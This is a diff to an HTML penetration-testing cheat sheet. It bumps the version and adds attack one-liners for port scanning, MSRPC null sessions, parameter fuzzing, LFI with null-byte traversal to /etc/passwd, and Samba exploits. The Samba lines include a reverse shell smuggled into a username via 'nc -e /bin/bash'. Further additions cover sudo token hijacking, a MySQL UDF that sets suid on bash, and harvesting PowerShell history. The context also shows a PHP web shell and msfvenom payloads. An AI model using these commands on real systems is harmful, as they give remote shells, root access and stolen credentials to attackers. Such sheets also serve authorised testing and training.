@@ -121,7 +121,7 @@ code{font-family:var(--mono);font-size:12.5px;color:#d7e3f4;background:var(--ele
   <a href="arsenal.html">arsenal</a>
   <a href="cheatsheet.html" aria-current="page">cheat sheet</a>
   <span class="sep"></span>
-  <span class="ver">v1.11.1</span>
+  <span class="ver">v1.12.0</span>
   <button type="button" id="printBtn">print</button>
 </nav>
 
@@ -172,6 +172,14 @@ sudo nmap -sU --top-ports 100 -T4 $IP -oN udp.nmap
 
 # rustscan alternative (faster discovery)
 rustscan -a $IP -- -sCV
+
+# masscan when -p- crawls or the host rate-limits: find the ports fast, let nmap do the rest
+sudo masscan -p1-65535 --rate 1000 -e tun0 $IP -oL masscan.txt
+ports=$(grep &#x27;^open&#x27; masscan.txt | awk &#x27;{print $3}&#x27; | paste -sd, -) &amp;&amp; nmap -sCV -p$ports -Pn $IP
+
+# MSRPC (135) - endpoint map, named pipes, and the SAM over a null session
+rpcdump.py $IP -p 135 | grep ncacn_np
+rpcclient -U &#x27;&#x27; -N $IP                        # enumdomusers, enumdomgroups, querydominfo, getdompwinfo
 
 # ident (113) names the user behind every open port
 ident-user-enum $IP 22 80 113 3306
@@ -263,6 +271,15 @@ curl -T shell.php http://$IP/</code></pre></div>
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>echo &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27; &gt; cmd.php
 cp /usr/share/webshells/php/php-reverse-shell.php shell.php
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx</code></pre></div>
+<p><strong>Fuzz the parameter, not just the path</strong> — a page that ignores you may just want a different name. Filter on a baseline or every wordlist entry looks like a hit.</p>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>ffuf -u &#x27;http://$IP/index.php?FUZZ=test&#x27; -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs &lt;size&gt;
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hw &lt;words&gt; &#x27;http://$IP/index.php?FUZZ=test&#x27;</code></pre></div>
+<p><strong>The certificate is free intelligence</strong> — SANs are vhosts you have not found yet, and the Subject holds internal hostnames and usernames.</p>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>openssl s_client -connect $IP:443 &lt;/dev/null 2&gt;/dev/null | openssl x509 -noout -text | grep -E &#x27;Subject:|DNS:&#x27;
+sslscan $IP:443
+nmap -p443 --script ssl-heartbleed,ssl-poodle $IP</code></pre></div>
+<p><strong>LFI on old PHP</strong> — before 5.3.4 a null byte truncates a hardcoded suffix, and <code>....//</code> survives a filter that strips <code>../</code> exactly once.</p>
+<div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>curl &#x27;http://$IP/?page=../../../../etc/passwd%00&#x27;</code></pre></div>
 <p>Reminder: if the browser redirects to a name, <code>echo "$IP &lt;host&gt;" | sudo tee -a /etc/hosts</code>.</p>
 <h2 id="smb-139-445" data-ports="139,445">SMB (139/445)</h2>
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>nxc smb $IP                                   # OS / domain / signing
@@ -276,7 +293,15 @@ smbclient //$IP/&lt;share&gt; -N                     # connect (or -U &#x27;&lt;
 smbclient //$IP/&lt;share&gt; -N -c &#x27;recurse ON; ls&#x27; # walk a share
 
 # password spray / cred check across a subnet
-nxc smb $IP -u users.txt -p &#x27;Password1&#x27; --continue-on-success</code></pre></div>
+nxc smb $IP -u users.txt -p &#x27;Password1&#x27; --continue-on-success
+
+# Samba? the banner version picks the exploit - read it before reaching for a tool
+nmap -p139,445 --script smb-os-discovery,smb-protocols $IP
+# 3.0.20-3.0.25rc3 -&gt; usermap_script, unauth RCE as root (CVE-2007-2447), payload goes in the USERNAME:
+smbclient //$IP/share -U &#x27;/=`nohup nc -e /bin/bash &#x27;$LHOST&#x27; &#x27;$LPORT&#x27;`&#x27;
+# &lt;= 4.5.9 + a writable share -&gt; SambaCry (CVE-2017-7494):  searchsploit -m linux/remote/42060.py
+# any version, writable share, &#x27;wide links = yes&#x27; -&gt; symlink traversal, read the whole filesystem:
+smbclient //$IP/share -N -c &#x27;symlink / rootfs; ls rootfs&#x27;</code></pre></div>
 <h2 id="snmp-161-udp" data-ports="161">SNMP (161/udp)</h2>
 <div class="block"><button class="copy" type="button" aria-label="Copy this block">copy</button><pre class="lang-bash"><code>onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP
 snmpwalk -v2c -c public $IP
@@ -422,11 +447,23 @@ python3 keytabextract.py /etc/krb5.keytab      # ccache: export KRB5CCNAME then 
 #   gcc -fPIC -shared -nostartfiles -o /tmp/x.so x.c   (x.c: void _init(){setuid(0);system(&quot;/bin/bash&quot;);})
 #   sudo LD_PRELOAD=/tmp/x.so &lt;any-allowed-binary&gt;
 # python import hijack: root script does &#x27;import config&#x27; and its dir is writable -&gt; drop config.py
+# someone else sudo&#x27;d minutes ago? borrow the live token instead of the password (nongiach/sudo_inject)
+cat /proc/sys/kernel/yama/ptrace_scope        # must be 0; then attach to a process of theirs, then: sudo -i
+# mysqld running as root that can write files = root, via a user-defined function (raptor_udf2)
+ps aux | grep mysqld                          # select @@plugin_dir; then dumpfile the .so there
+#   create function do_system returns integer soname &#x27;raptor_udf2.so&#x27;; select do_system(&#x27;chmod u+s /bin/bash&#x27;);
+# deleted != gone: a process still holding it open serves it straight out of /proc
+ls -l /proc/*/fd/* 2&gt;/dev/null | grep deleted  # then: cat /proc/&lt;pid&gt;/fd/&lt;n&gt; &gt; /tmp/recovered
+debugfs -R &#x27;lsdel&#x27; /dev/sda1                   # unlinked but not overwritten (needs disk group / root)
 
 # Windows
 .\winpeas.exe
 whoami /priv                                  # look for SeImpersonate -&gt; potato
 systeminfo                                    # then windows-exploit-suggester
+# PSReadline logs every command typed, forever, in plaintext - the most-skipped file on Windows
+type %APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\*.txt | Get-Content
+driverquery /v | findstr /v /i &quot;Microsoft&quot;     # signed-but-vulnerable 3rd-party driver = kernel write (loldrivers.io)
 # PoC is C source and the target has no compiler? cross-compile on Kali:
 x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -static   # i686-w64-mingw32-gcc for 32-bit
 # AppLocker default rules allow all of C:\Windows - these live inside it and are user-writable:
